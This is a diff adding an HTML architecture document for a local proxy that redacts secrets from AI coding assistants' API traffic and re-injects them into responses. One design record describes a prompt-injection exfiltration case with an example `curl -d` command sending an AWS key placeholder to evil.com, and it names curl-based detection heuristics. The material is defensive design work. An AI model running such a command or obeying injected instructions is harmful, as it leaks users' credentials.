@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guardian-AI v2 Technical Architecture</title>
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --text-color: #e2e8f0;
+            --heading-color: #f8fafc;
+            --accent-color: #38bdf8;
+            --card-bg: #1e293b;
+            --border-color: #334155;
+            --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        }
+
+        body {
+            font-family: var(--font-sans);
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            padding-bottom: 4rem;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 3rem;
+            padding-bottom: 2rem;
+        }
+
+        h1, h2, h3 {
+            color: var(--heading-color);
+            margin-top: 2rem;
+        }
+
+        h1 { font-size: 2.5rem; letter-spacing: -0.025em; }
+        h2 { font-size: 1.75rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem; margin-top: 3rem; }
+        
+        .badge {
+            background-color: var(--accent-color);
+            color: #000;
+            font-size: 0.8rem;
+            font-weight: 600;
+            padding: 0.2rem 0.6rem;
+            border-radius: 9999px;
+            vertical-align: middle;
+            margin-left: 0.5rem;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        code {
+            font-family: var(--font-mono);
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.9em;
+        }
+
+        pre code {
+            display: block;
+            padding: 1rem;
+            overflow-x: auto;
+            background-color: #000;
+        }
+
+        .mermaid {
+            background-color: #fff;
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+        }
+
+        .adr {
+            border-left: 4px solid var(--accent-color);
+            padding-left: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .adr-meta {
+            font-size: 0.9rem;
+            color: #94a3b8;
+            margin-bottom: 1rem;
+        }
+    </style>
+    <!-- Include Mermaid JS -->
+    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({startOnLoad:true, theme: 'default'});</script>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <h1>Guardian-AI v2 <span class="badge">Architecture Document</span></h1>
+        <p>Technical solution design for elevating llm-firewall-rs from a stateless proxy MVP to a top-1% open-source security middleware.</p>
+    </header>
+
+    <h2>1. Executive Summary</h2>
+    <p>Guardian-AI v2 is a "zero-config" local MITM (Man-in-the-Middle) proxy that protects developers from accidentally exfiltrating sensitive data (API keys, PII, proprietary hashes) when using AI coding assistants like Claude Code and Cursor. It achieves this via a novel 4-tier cascading detection pipeline and a bidirectional stateful proxy engine that safely redacts secrets outbound and transparently re-injects them inbound on the streaming response.</p>
+
+    <h2>2. System Topology (Crate Workspace)</h2>
+    <p>The monolithic MVP has been fractured into a cleaner, highly-testable crate workspace, resolving circular dependencies and providing a clear contributor boundary.</p>
+
+    <div class="mermaid">
+    graph TD
+        CLI[guardian-cli<br><i>Clap Entrypoint</i>]
+        Proxy[guardian-proxy<br><i>Axum MITM Server</i>]
+        Core[guardian-core<br><i>4-Tier Pipeline & State</i>]
+        
+        CLI -->|Spawns server| Proxy
+        CLI -->|Executes 'scan'| Core
+        Proxy -->|Routes payloads| Core
+        
+        subgraph guardian-core ["guardian-core"]
+            Orchestrator[Pipeline Orchestrator]
+            T1[Tier 1: Regex]
+            T2[Tier 2: Entropy]
+            T3[Tier 3: BERT NER]
+            T4[Tier 4: ONNX Classifier]
+            
+            Orchestrator --> T1
+            Orchestrator --> T2
+            Orchestrator --> T3
+            Orchestrator --> T4
+        end
+    </div>
+
+    <h2>3. The Request-Scoped Stateful Proxy</h2>
+    <p>To support CAP-1 (Bidirectional Proxy), the system evolves from a purely stateless filter. It maintains a <code>TokenMap</code> (e.g., <code>[GUARDIAN_AWS_1] -> AKIA...</code>) scoped exactly to the lifetime of the HTTP request-response cycle.</p>
+
+    <div class="mermaid">
+    sequenceDiagram
+        participant Client as AI Harness (Claude)
+        participant Proxy as guardian-proxy
+        participant Core as guardian-core
+        participant Upstream as OpenAI/Anthropic
+        
+        Client->>Proxy: POST /v1/chat/completions (Contains Secret)
+        activate Proxy
+        Proxy->>Core: Redact Outbound Payload
+        Core-->>Proxy: Redacted JSON + Arc&lt;TokenMap&gt;
+        Proxy->>Upstream: Forward Redacted POST
+        
+        Upstream-->>Proxy: SSE Stream Begins (data: ...)
+        loop Every SSE Chunk
+            Proxy->>Proxy: async-stream mutation<br/>Aho-Corasick matches placeholders
+            Proxy->>Proxy: Lookbehind Buffer checks<br/>for dangerous sinks (CAP-8)
+            Proxy-->>Client: Flushed Re-injected SSE Chunk
+        end
+        deactivate Proxy
+        Note over Proxy: Arc&lt;TokenMap&gt; naturally dropped.<br/>Zero cross-request state leakage.
+    </div>
+
+    <h2>4. The 4-Tier Cascading Detection Engine</h2>
+    <p>Detection uses a trait-based cascade. High-confidence, low-cost tiers execute first. Lower tiers only execute on borderline-confidence spans, preserving the strict sub-millisecond p99 latency budget.</p>
+
+    <div class="card">
+        <h3>Pipeline Execution Flow</h3>
+        <ol>
+            <li><strong>Tier 1 (Pattern Matching):</strong> Aho-Corasick automaton + Regex. (Cost: ~0.01ms). Deterministic matches bypass thresholds.</li>
+            <li><strong>Tier 2 (Contextual Entropy):</strong> Shannon entropy + heuristics. (Cost: ~0.05ms). Auto-adjusts threshold based on domain (e.g., Crypto repos get higher thresholds).</li>
+            <li><strong>Tier 3 (BERT NER):</strong> CPU-bound Named Entity Recognition via `candle`. (Cost: ~2-5ms). Runs in Tokio `spawn_blocking`.</li>
+            <li><strong>Tier 4 (Context-Aware Classifier):</strong> ONNX (`ort`) tree/encoder model. Only executes if T2/T3 yield a borderline score (0.5–0.7).</li>
+        </ol>
+    </div>
+
+    <h2>5. Interview-Ready Architecture Decision Records (ADRs)</h2>
+
+    <div class="adr">
+        <h3>ADR: Stateful Re-injection via Request-Scoping</h3>
+        <div class="adr-meta">Status: Accepted | Context: Bidirectional SSE streaming</div>
+        <p><strong>Context:</strong> To re-inject secrets on the inbound SSE stream, the proxy needs to map tokens (<code>[GUARDIAN_1]</code>) back to secrets. Global sticky sessions risk memory leaks and crash bugs.</p>
+        <p><strong>Decision:</strong> We bind state strictly to the HTTP request cycle using an <code>Arc&lt;TokenMap&gt;</code>. Because completions APIs are inherently stateless (the harness sends the full conversation history every time), we do not need cross-request memory. The map is passed from the outbound handler to the inbound stream task, and is automatically dropped when the TCP stream closes.</p>
+        <p><strong>Consequences:</strong> Zero eviction logic required. No vulnerability to Slowloris-style memory exhaustion attacks that target long-lived sessions.</p>
+    </div>
+
+    <div class="adr">
+        <h3>ADR: Stream Protection via Lookbehind Buffers</h3>
+        <div class="adr-meta">Status: Accepted | Context: Prompt-Injection Exfiltration (CAP-8)</div>
+        <p><strong>Context:</strong> A prompt-injected LLM could trick the AI harness by writing <code>curl -d "key=[GUARDIAN_AWS_1]" evil.com</code>. If we blindly re-inject the secret, we arm the trap.</p>
+        <p><strong>Decision:</strong> We implement a rolling ~512-byte Lookbehind Buffer in the inbound stream mutator. When a placeholder is detected, we run fast heuristics (e.g., checking for <code>curl</code>, <code>console.log</code>) against the buffer. If it's a dangerous sink, we quarantine the token instead of re-injecting.</p>
+        <p><strong>Consequences:</strong> We maintain the "real-time typing" SSE streaming UX (which full-block AST parsing would break) while mitigating the primary exfiltration attack vector.</p>
+    </div>
+
+    <div class="adr">
+        <h3>ADR: Foreground CLI Orchestrator</h3>
+        <div class="adr-meta">Status: Accepted | Context: Process Lifecycle</div>
+        <p><strong>Context:</strong> The "Zero-Config" requirement dictates <code>llm-firewall on</code> should magically protect the user. Background daemons are "invisible" but notoriously brittle.</p>
+        <p><strong>Decision:</strong> <code>llm-firewall on</code> blocks the terminal, running the server in the foreground. It sets system/tool proxy variables on start, and a Ctrl+C graceful shutdown hook restores them.</p>
+        <p><strong>Consequences:</strong> Maximum reliability. Users always know when the firewall is active. Prevents silent daemon crashes that leave developer machines without internet access.</p>
+    </div>
+
+</div>
+
+</body>
+</html>
